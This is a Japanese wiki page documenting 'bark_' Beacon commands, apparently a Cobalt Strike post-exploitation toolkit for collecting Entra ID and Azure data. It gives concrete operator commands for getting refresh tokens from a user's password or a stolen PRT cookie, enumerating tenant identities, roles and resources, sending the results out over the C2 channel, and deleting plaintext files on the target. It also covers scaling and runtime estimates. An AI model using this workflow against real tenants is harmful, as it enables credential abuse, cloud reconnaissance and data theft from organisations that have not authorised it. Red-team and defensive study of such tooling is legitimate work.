# Beacon 収集ワークフロー

[English](../Collection-Workflow.md) | [日本語](Collection-Workflow.md)
[Wiki の目次](Home.md) | [実行手順](../../README.ja.md)

## refresh token から全収集を開始する

`bark_get_all_info_bh_rt` に1つの refresh token を渡すと、audience ごとに access token を最大45分キャッシュします。未取得時は RT 交換を行い、ローテーションされた RT を以降にも使用します。通常の MS Graph 経路では MS Graph、CAP 用 legacy Graph、ARM の3回が探索用交換となり、最終 probe はこれらを再利用して Storage / Key Vault 用を追加取得します。

### 1. refresh token の取得

既存 RT があれば次へ進みます。ROPC が許可される場合は次を実行します。`offline_access` は内部で要求します。

```text
beacon> bark_get_tokens_with_up <tenantId> <username> <password> https://graph.microsoft.com
[+] refresh_token: <refreshToken>
```

`clientId` 省略時は既知6クライアントを試します。MFA、CAP、その他の対話認証が要求される password grant では使用できません。client ID が既知の場合は専用コマンドもあります。

```text
beacon> bark_get_entra_refresh_token_with_up <tenantId> <username> <password> <clientId>
```

有効な `x-ms-RefreshTokenCredential` PRT cookie があれば認可コードフローを使用できます。

```text
beacon> bark_get_token_with_prt_cookie <prtCookie> https://graph.microsoft.com <tenantId>
beacon> bark_get_token_with_prt_cookie <prtCookie> https://graph.microsoft.com <tenantId> <clientId> <redirectUri>
```

省略時は6クライアントと native-client redirect URI を使います。access token しか返らない場合、all-info の RT としては使用できません。取得した PRT に合う client ID / redirect URI を指定します。

### 2. ディスクレスで全収集

`[+] refresh_token:` の値を第2引数に渡します。

```text
beacon> bark_get_all_info_bh_rt <tenantId> <refreshToken>
```

download mode は CNA ロード時に ON です。BH JSON は個別に C2 経由で届き、データプレーンの探索と probe はメモリ内で動作します。開始・終了通知に Beacon ID と一意な all-info job ID が付くため、別 Beacon の並行収集を識別できます。

### 3. ZIP にまとめる場合

```text
beacon> bark_download_mode off
beacon> bark_get_all_info_bh_rt <tenantId> <refreshToken> MyStrongPassword!
```

JSON を対象側に一時保存し、Storage / Key Vault probe の後に ZIP 化して C2 で送信し、平文 `AZ*.json` を削除します。暗号化 ZIP は対象ディスクに保存せず、大きい場合はメモリ内で分割します。`bark_collect_*.zip.part000`、`.part001` などを[ローカルで再結合](Downloads-and-Archives.md#password-protected-zip-collection)してから展開します。

MS Graph の初回認証または収集中の BH 要求が失敗すると、legacy AAD Graph identity を先にキューに入れ、その後 ARM / probe へ進みます。最初から legacy を選ぶ例です。

```text
beacon> bark_get_all_info_legacy_bh <tenantId> <refreshToken> [password]
```

## umbrella コレクター

| コマンド | resource | 収集内容 |
| --- | --- | --- |
| `bark_get_entra_info_bh` | `https://graph.microsoft.com` | テナント、ユーザー、グループ、メンバー／所有者、デバイス／所有者、ロール定義／割り当て、アプリ、app-role、app owner、federated credentials、SP／owner |
| `bark_get_entra_info_legacy_bh` | `https://graph.windows.net` | legacy AAD Graph で対応する identity 情報 |
| `bark_get_azurerm_info_bh` | `https://management.azure.com` | subscription、RG、リソース、VM / VMSS、vault、storage、Logic / Function / Web、AKS / ACR、Automation、Container Apps / Instances、Cosmos DB、ロール定義／割り当て |

```text
beacon> bark_get_entra_info_bh         <msgraph_token> [password]
beacon> bark_get_entra_info_legacy_bh  <aadgraph_token> [password]
beacon> bark_get_azurerm_info_bh       <arm_token> [password]

beacon> bark_get_entra_info_bh_rt        <tenantId> <refreshToken> [password]
beacon> bark_get_entra_info_legacy_bh_rt <tenantId> <refreshToken> [password]
beacon> bark_get_azurerm_info_bh_rt      <tenantId> <refreshToken> [password]
beacon> bark_get_all_info_bh_rt          <tenantId> <refreshToken> [password]
beacon> bark_get_all_info_legacy_bh      <tenantId> <refreshToken> [password]
```

RT 版は resource token への交換も実行し、既知6クライアントを試します。末尾 password は download mode OFF の場合に `bark_zip_collect` を連結します。ON では警告して無視します。

## 実行順と中断時の復旧

同一 Beacon では RT umbrella を1件だけ pending にできます。all-info の終了時に状態を消去し、CNA ロード／再ロード時も workflow map を空にします。`bark_clear_rt_pending` は中断したジョブの復旧に使います。

Beacon check-in、出力、エラー、ダウンロード活動が60分ない場合、watchdog が通知を繰り返さず状態を消去します。別の保護対象 workflow の開始時にも stale 状態を確認します。複数 Beacon を使用する場合は開始通知の job ID を使い、対応する Beacon で `bark_clear_rt_pending <allInfoJobId>` を実行します。active ID が違う場合は拒否します。

all-info は Entra → CAP → ARM → 自己完結型データプレーン probe を実行します。audience ごとに token を再利用し、audience が変わると対応 token を取得します。同一 audience の再試行で45分を超えた場合も更新します。

独立した関連種類は BOF 内の worker thread で処理し、Beacon の inline task queue は順序を維持します。ARM は subscription snapshot をリソース種類間で共有し、検証済み generic-resource snapshot を最終 RBAC collector に渡します。無効／大きすぎる snapshot はページング付きのライブ探索へ切り替えます。

巨大な ARM COFF をまとめてロードせず、17個のリソース collector と2個の RBAC collector をそれぞれ終了待ち付きの別 check-in で動かします。リクエスト再利用を保ち、1回の loader allocation を1 collector に制限します。

ZIP 指定時は probe 完了後に `bark_collect_all_*.zip` を生成して平文 JSON を削除します。ディスクレス時に派生 RoleGraph が必要なら、ダウンロード完了後に `bark_convert_az_role_assignments_to_graph_bh`、またはローカルの `bark_role_graph.py` を使用します。

legacy 経路では `https://graph.windows.net` へ交換可能な RT が必要で、identity queue に CAP を含みます。途中で fallback した場合、先に成功した MS Graph の部分結果も残ります。

## 実行時間の目安

オブジェクト数だけでなく、関連がなくても親ごとに要求する collector の数が影響します。15 Entra collector と21 Azure RM collector の終了を待つため、Beacon sleep も直接影響します。

以下は MS Graph が成功し fallback / 429 がなく、Azure 往復100～300 ms、download mode ON、Beacon sleep が1秒以下という条件での計画値です。ARSP は app role を持つ SP、Resources は generic ARM inventory の件数です。

| 規模 | Users | Groups | Devices | Apps | SP | ARSP | Subscription | Resources | 時間 |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | --- |
| 参照ラボ | 101 | 37 | 10 | 57 | 679 | 99 | 1 | 1 | 約4～6分 |
| 小 | ～1,000 | ～100 | ～100 | ～100 | ～1,000 | ～150 | 1～3 | ～1,000 | 約7～20分 |
| 中 | ～10,000 | ～1,000 | ～2,000 | ～1,000 | ～10,000 | ～1,500 | ～20 | ～10,000 | 約1～3時間 |
| 大 | ～50,000 | ～5,000 | ～20,000 | ～5,000 | ～50,000 | ～7,500 | ～100 | ～50,000 | 約5～15時間以上 |

参照ラボでは最初の Entra 出力から最後の ARM 出力まで3分51秒でした。範囲には token 交換、変換、probe、C2 完了分も含めます。性能保証ではありません。

```text
GraphParentRequests = 2 * Groups
                    + Devices
                    + 2 * Apps
                    + ServicePrincipals
                    + ARSP

ArmRequests ~= Resources + 22 * Subscriptions + 8 * ManagementGroups + 3

ProbeRequests ~= StorageAccounts + KeyVaults
               + 2 * Subscriptions
               + 2 * AppListPages
               + 2 * ServicePrincipalListPages

HTTP time in seconds ~= (0.12 to 0.30) * GraphParentRequests
                     + (0.15 to 0.50) * ArmRequests
                     + (0.15 to 1.00) * ProbeRequests
```

グループの2回は members / owners、アプリの2回は owners / federated credentials です。SP は owner、ARSP は `appRoleAssignedTo` を要求します。ARSP が不明なら SP の15%を概算、100%を保守的上限として使います。

ARM はページング前の近似です。管理グループ項は assignment、descendant、definition、deny、4種類の PIM schedule / policy、定数3は subscription 一覧と2回の独立した管理グループ親一覧を表します。

token 交換と固定処理に20～90秒、さらに転送／ZIP と C2 待ちを加えます。正常時は約38～40回の終了待ちがあります。sleep 1秒を基準に、5秒なら約2.5分、30秒なら約18分、60秒なら約37分が増え、jitter も加わります。

ユーザー、ロール、割り当て、関連の子要素は主にページ数と出力サイズを増やします。999件を超えるメンバー／所有者は継続要求が必要です。429 は上記範囲に含まず、通知された Retry-After と適応的な送信間隔の増加を加算します。関連収集の完了行にある `parents`、`childRequests`、`attempts`、`retries`、`429` を実環境の見積もりに使います。
